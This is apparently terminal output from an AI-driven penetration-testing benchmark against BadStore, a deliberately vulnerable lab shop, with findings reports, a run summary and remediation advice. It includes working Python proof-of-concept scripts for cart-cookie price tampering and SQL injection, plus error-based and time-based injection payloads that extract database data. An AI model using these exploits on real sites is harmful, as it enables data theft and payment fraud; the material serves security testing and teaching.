+│  items at $11.50”\n   - Item 1005 appears in the cart table with price       │
+│  5000\n\n3) Proceed to checkout:\n   POST                                    │
+│  /cgi-bin/badstore.cgi?action=submitpayment\n   Body: cartitem=1005\n\n4)    │
+│  Place the order:\n   POST /cgi-bin/badstore.cgi?action=order\n   Body:      │
+│  email=buyer@example.com&ccard=4111111111111111&expdate=0128\n\n5) In the    │
+│  order confirmation response, observe:\n   - Item 1005 is still shown with   │
+│  price 5000\n   - The confirmation states “Purchased: 1 items at $11.50”     │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import re\nimport requests\n\nBASE = \"http://badstore\"\n\n# Forged cart   │
+│  cookie: <timestamp>:<count>:<total>:<item>\n# URL-encoded as observed by    │
+│  the application\nCARTID = \"1770996934%3A1%3A11.5%3A1005\"  #               │
+│  1770996934:1:11.5:1005\n\n\ndef parse_cart_contains(html: str):\n    m =    │
+│  re.search(r\"Cart                                                           │
+│  Contains:\\s*(\\d+)\\s*items?\\s*at\\s*\\$?([0-9]+(?:\\.[0-9]+)?)\", html,  │
+│  re.I)\n    return (int(m.group(1)), m.group(2)) if m else (None,            │
+│  None)\n\n\ndef parse_item_price(html: str, itemnum: str):\n    # Matches    │
+│  the row format:\n    # <tr><td>1005</td> ... <td>5000</td> <td ...><IMG     │
+│  ...>\n    m =                                                               │
+│  re.search(rf\"<tr><td>\\s*{re.escape(itemnum)}\\s*</td>.*?<td>\\s*(\\d+)\\  │
+│  s*</td>\\s*<td[^>]*>\\s*<IMG\",\n                  html, re.S | re.I)\n     │
+│  return m.group(1) if m else None\n\n\ndef parse_purchased(html: str):\n     │
+│  m =                                                                         │
+│  re.search(r\"Purchased:\\s*(\\d+)\\s*items?\\s*at\\s*\\$?([0-9]+(?:\\.[0-9  │
+│  ]+)?)\", html, re.I)\n    return (int(m.group(1)), m.group(2)) if m else    │
+│  (None, None)\n\n\ndef main():\n    s = requests.Session()\n    s.trust_env  │
+│  = False\n\n    headers = {\"Accept-Encoding\": \"identity\"}\n    cookies   │
+│  = {\"CartID\": CARTID}\n\n    # Step 1: view cart (shows                    │
+│  attacker-controlled total vs real item price)\n    r_cart =                 │
+│  s.get(f\"{BASE}/cgi-bin/badstore.cgi?action=cartview\", headers=headers,    │
+│  cookies=cookies, timeout=30)\n    r_cart.raise_for_status()\n\n    qty,     │
+│  total = parse_cart_contains(r_cart.text)\n    item_price =                  │
+│  parse_item_price(r_cart.text, \"1005\")\n\n    print(\"cart_status\",       │
+│  r_cart.status_code)\n    print(\"cart_qty\", qty)\n                         │
+│  print(\"cart_total\", total)\n    print(\"cart_item1005_price_cell\",       │
+│  item_price)\n\n    # Step 2: submit payment step\n    r_pay = s.post(\n     │
+│  f\"{BASE}/cgi-bin/badstore.cgi?action=submitpayment\",\n                    │
+│  headers={**headers, \"Content-Type\":                                       │
+│  \"application/x-www-form-urlencoded\"},\n        cookies=cookies,\n         │
+│  data={\"cartitem\": \"1005\", \"Place Order\": \"Place Order\"},\n          │
+│  timeout=30,\n    )\n    r_pay.raise_for_status()\n\n    # Step 3: finalize  │
+│  order\n    r_order = s.post(\n                                              │
+│  f\"{BASE}/cgi-bin/badstore.cgi?action=order\",\n                            │
+│  headers={**headers, \"Content-Type\":                                       │
+│  \"application/x-www-form-urlencoded\"},\n        cookies=cookies,\n         │
+│  data={\"email\": \"buyer@example.com\", \"ccard\": \"4111111111111111\",    │
+│  \"expdate\": \"0128\", \"subccard\": \"Place Order\"},\n                    │
+│  timeout=30,\n    )\n    r_order.raise_for_status()\n\n    pqty, ptotal =    │
+│  parse_purchased(r_order.text)\n    confirm_price =                          │
+│  parse_item_price(r_order.text, \"1005\")\n\n    print(\"order_status\",     │
+│  r_order.status_code)\n    print(\"purchased_qty\", pqty)\n                  │
+│  print(\"purchased_total\", ptotal)\n                                        │
+│  print(\"confirmation_item1005_price_cell\", confirm_price)\n\n    #         │
+│  Assertions act as automated proof checks\n    assert total == \"11.50\",    │
+│  \"Expected tampered cart total to be accepted\"\n    assert item_price ==   │
+│  \"5000\", \"Expected item price cell to show the real item price\"\n        │
+│  assert ptotal == \"11.50\", \"Expected purchased total to match tampered    │
+│  total\"\n    assert confirm_price == \"5000\", \"Expected confirmation to   │
+│  still show the real item price\"\n\n    print(\"evidence_ok\",              │
+│  True)\n\n\nif __name__ == \"__main__\":\n    main()\n                       │
+│                                                                              │
+│  Remediation                                                                 │
+│  Re-architect cart pricing to be server-authoritative:\n\n1) Do not store    │
+│  cart totals or item pricing in client-controlled cookies.\n\n2) On every    │
+│  cart display, checkout step, and order submission, recompute the total      │
+│  server-side from the product catalog and server-side cart contents.\n\n3)   │
+│  If client-side cart state must be used for performance reasons, apply       │
+│  cryptographic integrity (e.g., HMAC with a server-side secret) over the     │
+│  full cart payload and reject any tampered values. Even with integrity       │
+│  protection, still recompute totals server-side to reduce risk.\n\n4) Add    │
+│  automated tests to ensure totals cannot be reduced via cookie tampering     │
+│  and that any mismatch between displayed item prices and charged totals is   │
+│  rejected.                                                                   │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0006 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in Cart Add (cartitem) Enables Database Exfiltration   │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 10.0                                                            │
+│                                                                              │
+│  Target: http://badstore:80                                                  │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=cartadd                              │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                            │
+│                                                                              │
+│  Description                                                                 │
+│  A SQL injection vulnerability was identified in the “Add to Cart”           │
+│  workflow. The application passes the user-controlled POST parameter         │
+│  `cartitem` to a backend SQL query without proper                            │
+│  parameterization/escaping.                                                  │
+│                                                                              │
+│  The issue is exploitable using both error-based and time-based techniques.  │
+│  By manipulating `cartitem`, an unauthenticated attacker can trigger         │
+│  database errors, induce measurable delays via `SLEEP()`, and exfiltrate     │
+│  database contents.                                                          │
+│                                                                              │
+│  Impact                                                                      │
+│  An unauthenticated attacker can execute arbitrary SQL queries against the   │
+│  backend MariaDB/MySQL database. This enables full compromise of             │
+│  confidentiality and integrity of application data, including product        │
+│  catalog data, user/account data, and order/payment records. In practice,    │
+│  this can lead to data theft, order manipulation, privilege escalation (via  │
+│  tampering with user/role records), and potentially broader host compromise  │
+│  depending on database permissions and configuration.                        │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The endpoint `/cgi-bin/badstore.cgi?action=cartadd` accepts a POST body     │
+│  parameter `cartitem`. The parameter is incorporated into a SQL query in a   │
+│  way that allows injection of SQL metacharacters.                            │
+│                                                                              │
+│  Confirmed exploitation techniques:                                          │
+│                                                                              │
+│  An attacker can supply a single quote (`'`) to break out of the expected    │
+│  query context and trigger a database syntax error. The application returns  │
+│  a server-side error consistent with a MariaDB/MySQL parser error (HTTP      │
+│  500), which serves as a reliable error-based oracle.                        │
+│                                                                              │
+│  A time-based oracle is also present: injecting `SLEEP(n)` reliably          │
+│  increases server response time by ~n seconds while still returning HTTP     │
+│  200, proving attacker control over query execution timing.                  │
+│                                                                              │
+│  Finally, error-based data extraction is possible using XML/XPath error      │
+│  functions such as `EXTRACTVALUE()` / `UPDATEXML()`, which cause the         │
+│  database to return an error containing attacker-chosen data (e.g.,          │
+│  `user()`, `database()`, or selected table fields). This demonstrates        │
+│  direct, unauthenticated database exfiltration.                              │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Send a baseline request to add an item to the cart:                      │
+│     - POST `http://badstore/cgi-bin/badstore.cgi?action=cartadd`             │
+│     - Body: `cartitem=1000`                                                  │
+│     - Observe HTTP 200 response.                                             │
+│                                                                              │
+│  2. Trigger an error-based SQL injection:                                    │
+│     - POST `http://badstore/cgi-bin/badstore.cgi?action=cartadd`             │
+│     - Body: `cartitem=1000'`                                                 │
+│     - Observe HTTP 500 and a MariaDB/MySQL syntax error.                     │
+│                                                                              │
+│  3. Trigger a time-based SQL injection (delay oracle):                       │
+│     - POST `http://badstore/cgi-bin/badstore.cgi?action=cartadd`             │
+│     - Body: `cartitem=1000' and 0 in (select sleep(3) ) -- `                 │
+│     - Observe the response is delayed by ~3 seconds compared to baseline.    │
+│                                                                              │
+│  4. Demonstrate data exfiltration via error-based extraction:                │
+│     - POST `http://badstore/cgi-bin/badstore.cgi?action=cartadd`             │
+│     - Body: `cartitem=1000' AND extractvalue(1,concat(0x7e,(SELECT           │
+│  concat(itemnum,0x3a,sdesc) FROM itemdb LIMIT 0,1),0x7e)) -- `               │
+│     - Observe HTTP 500 where the returned error contains                     │
+│  attacker-controlled data (example observed: `~1000:Snake Oil~`).            │
+│                                                                              │
+│  Optional confirmation (environment fingerprinting):                         │
+│  - `cartitem=1000' AND updatexml(1,concat(0x7e,user(),0x7e),1) -- `          │
+│    - Example observed value: `~root@localhost~`                              │
+│  - `cartitem=1000' AND extractvalue(1,concat(0x7e,database(),0x7e)) -- `     │
+│    - Example observed value: `~badstoredb~`                                  │
+│                                                                              │
+│  PoC Code                                                                    │
+│  #!/usr/bin/env python3                                                      │
+│  import re                                                                   │
+│  import time                                                                 │
+│  import requests                                                             │
+│                                                                              │
+│  TARGET = "http://badstore/cgi-bin/badstore.cgi?action=cartadd"              │
+│                                                                              │
+│  def post_cartitem(val: str) -> tuple[int, float, str]:                      │
+│      start = time.time()                                                     │
+│      r = requests.post(                                                      │
+│          TARGET,                                                             │
+│          data={"cartitem": val},                                             │
+│          headers={"Content-Type": "application/x-www-form-urlencoded"},      │
+│          timeout=30,                                                         │
+│      )                                                                       │
+│      elapsed = time.time() - start                                           │
+│      return r.status_code, elapsed, r.text                                   │
+│                                                                              │
+│  def extract_between_tildes(body: str) -> str | None:                        │
+│      m = re.search(r"~([^~]{1,200})~", body)                                 │
+│      return m.group(1) if m else None                                        │
+│                                                                              │
+│  def main() -> int:                                                          │
+│      tests = [                                                               │
+│          ("baseline", "1000"),                                               │
+│          ("error_sqli", "1000'"),                                            │
+│          ("time_sqli_3s", "1000' and 0 in (select sleep(3) ) -- "),          │
+│          ("exfil_itemdb_first_row",                                          │
+│           "1000' AND extractvalue(1,concat(0x7e,(SELECT                      │
+│  concat(itemnum,0x3a,sdesc) FROM itemdb LIMIT 0,1),0x7e)) -- "),             │
+│          ("exfil_db_user",                                                   │
+│           "1000' AND updatexml(1,concat(0x7e,user(),0x7e),1) -- "),          │
+│          ("exfil_db_name",                                                   │
+│           "1000' AND extractvalue(1,concat(0x7e,database(),0x7e)) -- "),     │
+│      ]                                                                       │
+│                                                                              │
+│      for name, payload in tests:                                             │
+│          code, elapsed, body = post_cartitem(payload)                        │
+│          print(f"[{name}] status={code} time={elapsed:.2f}s                  │
+│  payload={payload!r}")                                                       │
+│                                                                              │
+│          leaked = extract_between_tildes(body)                               │
+│          if leaked:                                                          │
+│              print(f"  leaked: {leaked}")                                    │
+│                                                                              │
+│          # Show small snippet for error confirmation                         │
+│          snippet = body[:250].replace("\n", "\\n")                           │
+│          print(f"  body_snippet: {snippet}")                                 │
+│          print("-" * 80)                                                     │
+│                                                                              │
+│      return 0                                                                │
+│                                                                              │
+│  if __name__ == "__main__":                                                  │
+│      raise SystemExit(main())                                                │
+│                                                                              │
+│  Remediation                                                                 │
+│  Implement robust SQL injection defenses:                                    │
+│  1. Replace dynamic SQL string construction with parameterized queries       │
+│  (prepared statements) for all database interactions involving user input.   │
+│  2. Enforce strict server-side input validation for `cartitem` (e.g.,        │
+│  numeric allowlist) before query execution.                                  │
+│  3. Ensure the database account used by the application has least-privilege  │
+│  permissions (avoid administrative accounts; restrict read/write to only     │
+│  required tables).                                                           │
+│  4. Disable verbose database errors in HTTP responses and implement generic  │
+│  error handling to prevent information leakage.                              │
+│  5. Add regression tests for injection payloads and deploy                   │
+│  monitoring/alerting for anomalous query patterns (e.g., `sleep`,            │
+│  `extractvalue`, `updatexml`).                                               │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test in progress                                                │
+│                                                                              │
+│  Model openai/gpt-5.2-2025-12-11                                             │
+│  Vulnerabilities 6                                                           │
+│  CRITICAL: 5 | HIGH: 1                                                       │
+│  Agents 21  ·  Tools 569                                                     │
+│  Input Tokens 7.5M  ·  Cached Tokens 6.6M                                    │
+│  Output Tokens 68.1K  ·  Cost $3.6811                                        │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test summary                                                    │
+│                                                                              │
+│  # Executive Summary                                                         │
+│                                                                              │
+│  An external penetration test of the BadStore web application identified     │
+│  multiple critical vulnerabilities that enable complete compromise of        │
+│  application data and administrative functionality.\n\nOverall risk posture  │
+│  is critical. Multiple injection and access control weaknesses allow         │
+│  unauthenticated attackers to extract database contents, read sensitive      │
+│  files from the server (including application source and database            │
+│  credentials), impersonate arbitrary users and administrators by forging     │
+│  session cookies, and access payment-card data through order history and     │
+│  administrative reporting. A separate business-logic flaw allows an          │
+│  attacker to underpay for high-value items by modifying client-side cart     │
+│  state.\n\nImmediate remediation should prioritize eliminating SQL           │
+│  injection across all request paths and replacing the current                │
+│  client-controlled authentication/session approach with server-side          │
+│  sessions or cryptographically protected tokens, followed by comprehensive   │
+│  authorization enforcement and payment-data minimization                     │
+│  (masking/tokenization).                                                     │
+│                                                                              │
+│  # Methodology                                                               │
+│                                                                              │
+│  Testing was conducted as a black-box web application assessment aligned to  │
+│  the OWASP Web Security Testing Guide (WSTG) and standard penetration        │
+│  testing practices.\n\nActivities performed included reconnaissance and      │
+│  service enumeration, attack-surface mapping of CGI actions and form         │
+│  handlers, parameter discovery, automated and manual vulnerability testing,  │
+│  and proof-based validation. Only issues that were validated with            │
+│  reproducible evidence and clear impact were treated as confirmed findings   │
+│  and were documented in individual vulnerability reports.                    │
+│                                                                              │
+│  # Technical Analysis                                                        │
+│                                                                              │
+│  Severity model\nSeverity reflects exploitability and impact to              │
+│  confidentiality, integrity, and availability in realistic attacker          │
+│  scenarios.\n\nConfirmed findings\nStored cross-site scripting in guestbook  │
+│  entry rendering (High) — vuln-0001\nUser-controlled input submitted to the  │
+│  guestbook is persisted and rendered without output encoding on the page     │
+│  that lists entries. This enables JavaScript execution in the context of     │
+│  the application for any viewer of the guestbook listing.\n\nSQL injection   │
+│  in login endpoint enables authentication bypass (Critical) —                │
+│  vuln-0002\nThe login workflow is vulnerable to SQL injection, allowing an   │
+│  attacker to bypass authentication and obtain an authenticated session       │
+│  without valid credentials.\n\nSQL injection in search endpoint enables      │
+│  database exfiltration and arbitrary file read/source disclosure (Critical)  │
+│  — vuln-0003\nThe search parameter is vulnerable to SQL injection.           │
+│  Exploitation confirmed database enumeration and extraction and              │
+│  demonstrated arbitrary file read via database functions, including          │
+│  disclosure of application source code and embedded database                 │
+│  credentials.\n\nSSOid session cookie forgery enables unauthenticated admin  │
+│  impersonation and access to sensitive payment data (Critical) —             │
+│  vuln-0004\nThe application trusts a client-supplied session cookie that     │
+│  encodes identity and role information without integrity protection. This    │
+│  allows unauthenticated attackers to forge cookies to impersonate arbitrary  │
+│  users and administrators.\n\nThis weakness was additionally validated to    │
+│  expose payment data through user order history (forged identity returns     │
+│  prior orders including full card number in the “Card Used” field) and       │
+│  through administrative functionality (administrative reports include        │
+│  payment card data).\n\nCart total tampering via client-controlled CartID    │
+│  cookie enables underpayment (High) — vuln-0005\nThe shopping cart total is  │
+│  trusted from a client-side cookie. An attacker can modify the cart total    │
+│  while keeping expensive items in the cart and complete checkout at an       │
+│  attacker-chosen amount.\n\nSQL injection in cart add (cartitem) enables     │
+│  database exfiltration (Critical) — vuln-0006\nThe cart add endpoint         │
+│  parameter is vulnerable to SQL injection, confirmed via error- and          │
+│  time-based techniques and demonstrated data extraction from the             │
+│  database.\n\nSystemic root causes\nThe primary root causes were unsafe      │
+│  construction of SQL queries using user input, insufficient output encoding  │
+│  for untrusted data, and fundamental trust in client-controlled security     │
+│  state (session identity, role, and pricing). Error handling also discloses  │
+│  sensitive internal details that materially aid exploitation.                │
+│                                                                              │
+│  # Recommendations                                                           │
+│                                                                              │
+│  Immediate priority\nEliminate SQL injection across all endpoints.\nUse      │
+│  parameterized queries/prepared statements for all database access and       │
+│  remove dynamic SQL concatenation. Implement centralized input validation    │
+│  with strict allowlists and enforce data typing. Suppress database error     │
+│  messages in responses and ensure errors are logged server-side              │
+│  only.\n\nReplace or redesign the SSOid authentication/session               │
+│  mechanism.\nDo not trust client-side identity or role fields. Implement     │
+│  server-side sessions or cryptographically signed tokens (HMAC with key      │
+│  rotation) and enforce authorization server-side for every sensitive         │
+│  action. Ensure cookies are set with Secure, HttpOnly, and appropriate       │
+│  SameSite attributes.\n\nRestrict access to administrative                   │
+│  functionality.\nRemove “secret” administrative entry points from public     │
+│  routing or enforce strong authentication and role-based authorization       │
+│  checks on every admin action. Add monitoring and alerting for unauthorized  │
+│  access attempts.\n\nReduce payment-data exposure.\nDo not store or display  │
+│  full card numbers in application responses. Apply masking and               │
+│  tokenization; ensure compliance with applicable payment data standards.     │
+│  Treat any display of full PAN as a high-risk issue requiring immediate      │
+│  correction.\n\nShort-term priority\nFix stored XSS in guestbook and other   │
+│  content-rendering paths.\nApply context-appropriate output encoding for     │
+│  all user-controlled fields (HTML body, attributes, URLs). Consider a        │
+│  Content Security Policy (CSP) as defense-in-depth. Validate that both the   │
+│  submission response and the entry listing page are safe.\n\nFix cart and    │
+│  pricing integrity.\nRecompute cart totals server-side at each step of       │
+│  checkout using authoritative item prices. Do not store pricing or totals    │
+│  in client-side cookies. If any client-side state is retained, protect it    │
+│  with integrity checks and still recompute on the server.\n\nMedium-term     │
+│  priority\nApply least-privilege to database and OS layers.\nEnsure the      │
+│  application database user does not have excessive privileges (e.g., FILE    │
+│  access and other administrative capabilities). Add defense-in-depth         │
+│  controls that reduce the blast radius of SQL injection.\n\nAdd regression   │
+│  tests and security review gates.\nImplement automated tests for SQL         │
+│  injection, stored XSS, and authorization bypass scenarios, including        │
+│  negative tests for cross-user access and role escalation. Perform a         │
+│  focused retest after remediation to confirm fixes and validate that no      │
+│  alternate injection points or bypasses remain.                              │
+│                                                                              │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test completed                                                  │
+│                                                                              │
+│  Target  http://badstore:80                                                  │
+│  Vulnerabilities  CRITICAL: 5 | HIGH: 1 (Total: 6)                           │
+│  Agents  21  ·  Tools  570                                                   │
+│  Input Tokens 7.6M  ·  Cached Tokens 6.6M  ·  Output Tokens 69.9K · Cost     │
+│  $3.7267                                                                     │
+│                                                                              │
+│  Output  strix_runs/badstore-80_aad3                                         │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+Archived strix_runs/ output
+
+>>> Archiving /tmp artifacts from run 2...
+No /tmp artifacts to archive
+
+>>> badstore — run 2 complete.
+
+>>> All benchmark runs finished.
+
+╭─ ~/FERR/openhack/docker openhack !6 ?3                                                                                                             2h 9m 26s  system
+╰─❯
